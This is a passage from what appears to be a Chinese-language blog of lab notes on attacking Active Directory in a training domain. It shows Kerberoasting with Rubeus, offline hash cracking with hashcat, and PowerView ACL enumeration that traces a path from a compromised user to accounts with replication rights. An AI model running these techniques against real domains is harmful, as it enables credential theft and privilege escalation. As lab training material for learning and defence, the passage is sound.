class="variable">$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266</span></span><br></pre></td></tr></table></figure>

<h3 id="检查支持的加密类型"><a href="#检查支持的加密类型" class="headerlink" title="检查支持的加密类型"></a>检查支持的加密类型</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> testspn <span class="literal">-Properties</span> samaccountname,serviceprincipalname,msds<span class="literal">-supportedencryptiontypes</span></span><br><span class="line"></span><br><span class="line">serviceprincipalname                   msds<span class="literal">-supportedencryptiontypes</span> samaccountname</span><br><span class="line"><span class="literal">--------------------</span>                   <span class="literal">-----------------------------</span> <span class="literal">--------------</span></span><br><span class="line">testspn/kerberoast.inlanefreight.local                            <span class="number">24</span> testspn</span><br></pre></td></tr></table></figure>

<h3 id="请求新票据"><a href="#请求新票据" class="headerlink" title="请求新票据"></a>请求新票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt;  .\Rubeus.exe kerberoast /user:testspn /nowrap</span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target User            : testspn</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : testspn</span><br><span class="line">[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local</span><br><span class="line">[*] PwdLastSet             : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">15</span>:<span class="number">43</span> PM</span><br><span class="line">[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$18</span><span class="variable">$testspn</span><span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$</span>*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*<span class="variable">$8939F8C5B97A4</span></span><br></pre></td></tr></table></figure>

<p>要通过 Hashcat 运行此操作，我们需要使用哈希模式 <code>19700</code> ，根据 Hashcat 的 example_hashes 表，这是 <code>Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)</code> 。我们按如下方式运行 AES 哈希并检查状态，显示通过输入 <code>s</code> 查看破解作业状态，预计需要超过 23 分钟才能遍历整个 rockyou.txt 字典。</p>
<h3 id="运行-Hashcat-并检查破解任务状态"><a href="#运行-Hashcat-并检查破解任务状态" class="headerlink" title="运行 Hashcat 并检查破解任务状态"></a>运行 Hashcat 并检查破解任务状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt </span><br><span class="line"></span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Name........: Kerberos 5, etype 18, TGS-REP</span><br><span class="line">Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53</span><br><span class="line">Time.Started.....: Sun Feb 27 16:07:50 2022 (57 secs)</span><br><span class="line">Time.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs)</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:    10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8</span><br><span class="line">Recovered........: 0/1 (0.00%) Digests</span><br><span class="line">Progress.........: 583680/14344385 (4.07%)</span><br><span class="line">Rejected.........: 0/583680 (0.00%)</span><br><span class="line">Restore.Point....: 583680/14344385 (4.07%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328</span><br><span class="line">Candidates.#1....: skitzy -&gt; sammy&lt;3</span><br><span class="line"></span><br><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br></pre></td></tr></table></figure>

<h3 id="查看破解所需时间"><a href="#查看破解所需时间" class="headerlink" title="查看破解所需时间"></a>查看破解所需时间</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: Kerberos <span class="number">5</span>, etype <span class="number">18</span>, TGS<span class="literal">-REP</span></span><br><span class="line">Hash.Target......: <span class="variable">$krb5tgs</span><span class="variable">$18</span><span class="variable">$testspn</span><span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$8939f8c5b97</span>...<span class="number">413</span>d53</span><br><span class="line">Time.Started.....: Sun Feb <span class="number">27</span> <span class="number">16</span>:<span class="number">07</span>:<span class="number">50</span> <span class="number">2022</span> (<span class="number">4</span> mins, <span class="number">36</span> secs)</span><br><span class="line">Time.Estimated...: Sun Feb <span class="number">27</span> <span class="number">16</span>:<span class="number">12</span>:<span class="number">26</span> <span class="number">2022</span> (<span class="number">0</span> secs)</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: <span class="number">1</span>/<span class="number">1</span> (<span class="number">100.00</span>%)</span><br><span class="line">Speed.<span class="comment">#1.........:    10114 H/s (9.25ms) @ Accel:1024 Loops:64 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: <span class="number">1</span>/<span class="number">1</span> (<span class="number">100.00</span>%) Digests</span><br><span class="line">Progress.........: <span class="number">2789376</span>/<span class="number">14344385</span> (<span class="number">19.45</span>%)</span><br><span class="line">Rejected.........: <span class="number">0</span>/<span class="number">2789376</span> (<span class="number">0.00</span>%)</span><br><span class="line">Restore.Point....: <span class="number">2783232</span>/<span class="number">14344385</span> (<span class="number">19.40</span>%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:4032-4095</span></span><br><span class="line">Candidates.<span class="comment">#1....: wenses28 -&gt; wejustare</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-tgtdeleg-标志"><a href="#使用-tgtdeleg-标志" class="headerlink" title="使用 &#x2F;tgtdeleg 标志"></a>使用 &#x2F;tgtdeleg 标志</h3><p>我们可以使用 Rubeus 并结合 <code>/tgtdeleg</code> 标志来指定在请求新服务票据时仅使用 RC4 加密。该工具通过在 TGS 请求体中指定 RC4 加密为唯一支持的算法来实现这一点。这可能是 Active Directory 内置的一种向后兼容的保障措施。通过使用此标志，我们可以请求一个 RC4（类型 23）加密的票据，该票据破解速度会快得多。</p>
<h1 id="ACL滥用"><a href="#ACL滥用" class="headerlink" title="ACL滥用"></a>ACL滥用</h1><h2 id="ACL-枚举"><a href="#ACL-枚举" class="headerlink" title="ACL 枚举"></a>ACL 枚举</h2><h3 id="使用-PowerView-枚举-ACL"><a href="#使用-PowerView-枚举-ACL" class="headerlink" title="使用 PowerView 枚举 ACL"></a>使用 PowerView 枚举 ACL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Find-InterestingDomainAcl</span></span><br><span class="line"></span><br><span class="line">ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : ab721a53<span class="literal">-1e2f-11d0-9819-00aa0040529b</span></span><br><span class="line">AceFlags                : ContainerInherit</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : ContainerInherit</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5189</span></span><br><span class="line">IdentityReferenceName   : Exchange Windows Permissions</span><br><span class="line">IdentityReferenceDomain : INLANEFREIGHT.LOCAL</span><br><span class="line">IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security </span><br><span class="line">                          Groups,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">IdentityReferenceClass  : <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br><span class="line">AceFlags                : ContainerInherit</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : ContainerInherit</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5189</span></span><br><span class="line">IdentityReferenceName   : Exchange Windows Permissions</span><br><span class="line">IdentityReferenceDomain : INLANEFREIGHT.LOCAL</span><br><span class="line">IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security </span><br><span class="line">                          Groups,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">IdentityReferenceClass  : <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$sid</span> = <span class="built_in">Convert-NameToSid</span> wley</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainObjectACL"><a href="#使用-Get-DomainObjectACL" class="headerlink" title="使用 Get-DomainObjectACL"></a>使用 Get-DomainObjectACL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125;</span><br><span class="line"></span><br><span class="line">ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ObjectSID              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1176</span></span><br><span class="line">ActiveDirectoryRights  : ExtendedRight</span><br><span class="line">ObjectAceFlags         : ObjectAceTypePresent</span><br><span class="line">ObjectAceType          : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br><span class="line">InheritedObjectAceType : <span class="number">00000000</span><span class="literal">-0000-0000-0000-000000000000</span></span><br><span class="line">BinaryLength           : <span class="number">56</span></span><br><span class="line">AceQualifier           : AccessAllowed</span><br><span class="line">IsCallback             : False</span><br><span class="line">OpaqueLength           : <span class="number">0</span></span><br><span class="line">AccessMask             : <span class="number">256</span></span><br><span class="line">SecurityIdentifier     : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1181</span></span><br><span class="line">AceType                : AccessAllowedObject</span><br><span class="line">AceFlags               : ContainerInherit</span><br><span class="line">IsInherited            : False</span><br><span class="line">InheritanceFlags       : ContainerInherit</span><br><span class="line">PropagationFlags       : None</span><br><span class="line">AuditFlags             : None</span><br></pre></td></tr></table></figure>

<h3 id="执行反向搜索与映射到-GUID-值"><a href="#执行反向搜索与映射到-GUID-值" class="headerlink" title="执行反向搜索与映射到 GUID 值"></a>执行反向搜索与映射到 GUID 值</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$guid</span>= <span class="string">&quot;00299570-246d-11d0-a768-00aa006e0529&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADObject</span> <span class="literal">-SearchBase</span> <span class="string">&quot;CN=Extended-Rights,<span class="variable">$</span>((Get-ADRootDSE).ConfigurationNamingContext)&quot;</span> <span class="literal">-Filter</span> &#123;ObjectClass <span class="operator">-like</span> <span class="string">&#x27;ControlAccessRight&#x27;</span>&#125; <span class="literal">-Properties</span> * |<span class="built_in">Select</span> Name,DisplayName,DistinguishedName,rightsGuid| ?&#123;<span class="variable">$_</span>.rightsGuid <span class="operator">-eq</span> <span class="variable">$guid</span>&#125; | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">Name              : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">DisplayName       : Reset Password</span><br><span class="line">DistinguishedName : CN=User<span class="literal">-Force-Change-Password</span>,CN=Extended<span class="literal">-Rights</span>,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">rightsGuid        : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br></pre></td></tr></table></figure>

<h3 id="Using-the-ResolveGUIDs-Flag"><a href="#Using-the-ResolveGUIDs-Flag" class="headerlink" title="Using the -ResolveGUIDs Flag"></a>Using the -ResolveGUIDs Flag</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125; </span><br><span class="line"></span><br><span class="line">AceQualifier           : AccessAllowed</span><br><span class="line">ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights  : ExtendedRight</span><br><span class="line">ObjectAceType          : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">ObjectSID              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1176</span></span><br><span class="line">InheritanceFlags       : ContainerInherit</span><br><span class="line">BinaryLength           : <span class="number">56</span></span><br><span class="line">AceType                : AccessAllowedObject</span><br><span class="line">ObjectAceFlags         : ObjectAceTypePresent</span><br><span class="line">IsCallback             : False</span><br><span class="line">PropagationFlags       : None</span><br><span class="line">SecurityIdentifier     : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1181</span></span><br><span class="line">AccessMask             : <span class="number">256</span></span><br><span class="line">AuditFlags             : None</span><br><span class="line">IsInherited            : False</span><br><span class="line">AceFlags               : ContainerInherit</span><br><span class="line">InheritedObjectAceType : All</span><br><span class="line">OpaqueLength           : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h3 id="创建域用户列表"><a href="#创建域用户列表" class="headerlink" title="创建域用户列表"></a>创建域用户列表</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> SamAccountName &gt; ad_users.txt</span><br></pre></td></tr></table></figure>

<h3 id="一个有用的-foreach-循环"><a href="#一个有用的-foreach-循环" class="headerlink" title="一个有用的 foreach 循环"></a>一个有用的 foreach 循环</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="keyword">foreach</span>(<span class="variable">$line</span> <span class="keyword">in</span> [<span class="type">System.IO.File</span>]::ReadLines(<span class="string">&quot;C:\Users\htb-student\Desktop\ad_users.txt&quot;</span>)) &#123;<span class="built_in">get-acl</span>  <span class="string">&quot;AD:\<span class="variable">$</span>(Get-ADUser <span class="variable">$line</span>)&quot;</span> | <span class="built_in">Select-Object</span> Path <span class="literal">-ExpandProperty</span> Access | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&#x27;INLANEFREIGHT\\wley&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana </span><br><span class="line">                        Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">InheritanceType       : All</span><br><span class="line">ObjectType            : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br><span class="line">InheritedObjectType   : <span class="number">00000000</span><span class="literal">-0000-0000-0000-000000000000</span></span><br><span class="line">ObjectFlags           : ObjectAceTypePresent</span><br><span class="line">AccessControlType     : Allow</span><br><span class="line">IdentityReference     : INLANEFREIGHT\wley</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit</span><br><span class="line">PropagationFlags      : None</span><br></pre></td></tr></table></figure>

<h3 id="使用-damundsen-进一步枚举权限"><a href="#使用-damundsen-进一步枚举权限" class="headerlink" title="使用 damundsen 进一步枚举权限"></a>使用 damundsen 进一步枚举权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$sid2</span> = <span class="built_in">Convert-NameToSid</span> damundsen</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid2</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">AceType               : AccessAllowed</span><br><span class="line">ObjectDN              : CN=Help Desk Level <span class="number">1</span>,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite</span><br><span class="line">OpaqueLength          : <span class="number">0</span></span><br><span class="line">ObjectSID             : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-4022</span></span><br><span class="line">InheritanceFlags      : ContainerInherit</span><br><span class="line">BinaryLength          : <span class="number">36</span></span><br><span class="line">IsInherited           : False</span><br><span class="line">IsCallback            : False</span><br><span class="line">PropagationFlags      : None</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1176</span></span><br><span class="line">AccessMask            : <span class="number">131132</span></span><br><span class="line">AuditFlags            : None</span><br><span class="line">AceFlags              : ContainerInherit</span><br><span class="line">AceQualifier          : AccessAllowed</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainGroup-调查Help-Level-1-Group"><a href="#使用-Get-DomainGroup-调查Help-Level-1-Group" class="headerlink" title="使用 Get-DomainGroup 调查Help Level 1 Group"></a>使用 Get-DomainGroup 调查Help Level 1 Group</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> | <span class="built_in">select</span> memberof</span><br><span class="line"></span><br><span class="line">memberof                                                                      </span><br><span class="line"><span class="literal">--------</span>                                                                      </span><br><span class="line">CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br></pre></td></tr></table></figure>

<ul>
<li>我们控制了用户 <code>wley</code> ，其哈希值在模块（评估）中通过 Responder 获取，并使用 Hashcat 离线破解以揭示明文密码值</li>
<li>我们枚举了用户 <code>wley</code> 控制的对象，并发现可以强制更改用户 <code>damundsen</code> 的密码</li>
<li>从这里，我们发现 <code>damundsen</code> 用户可以使用 <code>GenericWrite</code> 权限向 <code>Help Desk Level 1</code> 组添加成员</li>
<li><code>Help Desk Level 1</code> 组嵌套在 <code>Information Technology</code> 组中，这使得该组成员获得授予 <code>Information Technology</code> 组的所有权限</li>
</ul>
<h3 id="调查Information-Technology-Group"><a href="#调查Information-Technology-Group" class="headerlink" title="调查Information Technology Group"></a>调查Information Technology Group</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$itgroupsid</span> = <span class="built_in">Convert-NameToSid</span> <span class="string">&quot;Information Technology&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$itgroupsid</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">AceType               : AccessAllowed</span><br><span class="line">ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : GenericAll</span><br><span class="line">OpaqueLength          : <span class="number">0</span></span><br><span class="line">ObjectSID             : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">InheritanceFlags      : ContainerInherit</span><br><span class="line">BinaryLength          : <span class="number">36</span></span><br><span class="line">IsInherited           : False</span><br><span class="line">IsCallback            : False</span><br><span class="line">PropagationFlags      : None</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-4016</span></span><br><span class="line">AccessMask            : <span class="number">983551</span></span><br><span class="line">AuditFlags            : None</span><br><span class="line">AceFlags              : ContainerInherit</span><br><span class="line">AceQualifier          : AccessAllowed</span><br></pre></td></tr></table></figure>

<h3 id="寻找有趣的访问"><a href="#寻找有趣的访问" class="headerlink" title="寻找有趣的访问"></a>寻找有趣的访问</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$adunnsid</span> = <span class="built_in">Convert-NameToSid</span> adunn </span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$adunnsid</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">AceQualifier           : AccessAllowed</span><br><span class="line">ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights  : ExtendedRight</span><br><span class="line">ObjectAceType          : DS<span class="literal">-Replication-Get-Changes-In-Filtered-Set</span></span><br><span class="line">ObjectSID              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114</span></span><br><span class="line">InheritanceFlags       : ContainerInherit</span><br><span class="line">BinaryLength           : <span class="number">56</span></span><br><span class="line">AceType                : AccessAllowedObject</span><br><span class="line">ObjectAceFlags         : 